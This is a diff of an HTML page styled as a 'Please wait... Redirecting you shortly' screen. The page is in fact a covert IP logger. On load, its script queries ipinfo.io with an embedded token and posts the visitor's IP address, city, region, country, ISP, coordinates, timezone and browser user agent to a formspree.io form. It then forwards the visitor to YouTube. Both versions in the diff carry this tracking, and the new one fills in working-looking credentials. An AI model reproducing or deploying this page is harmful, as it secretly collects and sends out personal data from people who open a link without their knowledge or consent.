@@ -1,33 +1,60 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Redirecting...</title>
-  <script>
-    // Function to get IP & location using ipinfo.io API
-    async function logVisitorInfo() {
-      try {
-        const res = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE');
-        const data = await res.json();// Send to server (optional)
-    await fetch("https://formspree.io/f/YOUR_FORM_ID", {
-      method: "POST",
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data),
-    });
-  } catch (err) {
-    console.error("Logging failed:", err);
-  } finally {
-    // Redirect to any site
-    window.location.href = "https://youtube.com";
-  }
-}
-
-// Run as soon as page loads
-window.onload = logVisitorInfo;
-
-  </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f4f8;
+      color: #333;
+      text-align: center;
+      padding: 100px 20px;
+    }
+    .box {
+      background: white;
+      display: inline-block;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+  </style>
 </head>
 <body>
-  <p>Redirecting...</p>
+  <div class="box">
+    <h2>Please wait...</h2>
+    <p>Redirecting you shortly...</p>
+  </div>
+
+  <script>
+    async function logVisitorInfo() {
+      try {
+        const res = await fetch("https://ipinfo.io/json?token=457215f5fb7c94");
+        const data = await res.json();
+
+        await fetch("https://formspree.io/f/mldnbqvo", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country,
+            org: data.org,
+            location: data.loc,
+            timezone: data.timezone,
+            user_agent: navigator.userAgent
+          })
+        });
+      } catch (err) {
+        console.error("Logging failed:", err);
+      } finally {
+        window.location.href = "https://youtube.com"; // চাইলে এখানে redirect URL বদলাও
+      }
+    }
+
+    window.onload = logVisitorInfo;
+  </script>
 </body>
 </html>
